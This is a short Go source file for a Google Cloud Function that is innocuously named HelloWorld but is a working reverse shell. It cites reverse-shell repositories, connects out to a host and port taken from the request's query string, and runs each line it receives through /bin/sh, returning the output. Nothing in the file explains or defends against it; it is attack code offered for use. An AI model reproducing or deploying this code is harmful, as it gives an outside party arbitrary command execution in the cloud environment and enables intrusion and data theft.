/*
References:
https://github.com/sathish09/rev2go
https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
*/
package p

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func respondWithError(w http.ResponseWriter, errMsg string) {
	type Response struct {
		Error string
	}

	response := &Response{Error: errMsg}
	responseJson, _ := json.Marshal(response)
	fmt.Fprintf(w, "%s", responseJson)
}

func HelloWorld(w http.ResponseWriter, r *http.Request) {
	timeout, _ := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)

	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
	time.AfterFunc(time.Duration(timeout) * time.Second, func() {
		os.Exit(0)
	})

	type Response struct {
		Error string
	}

	host := r.URL.Query().Get("host")
	port := r.URL.Query().Get("port")

	if host == "" || port == "" {
		respondWithError(w, "Must provide the host and port for the target TCP server as query parameters.")
		return
	}

	portNum, err := strconv.ParseUint(r.URL.Query().Get("port"), 10, 64)

	if err != nil {
		respondWithError(w, err.Error())
		return
	}

	connString := fmt.Sprintf("%s:%d", host, portNum)

	conn, _ := net.Dial("tcp", connString)

	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')

		messageTrimmed := strings.TrimSuffix(message, "\n")

		if (messageTrimmed == "exit") {
			respondWithError(w, "Connection terminated from client.")
			conn.Close()
			return
		}

		out, err := exec.Command("/bin/sh", "-c", messageTrimmed).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
	}
}
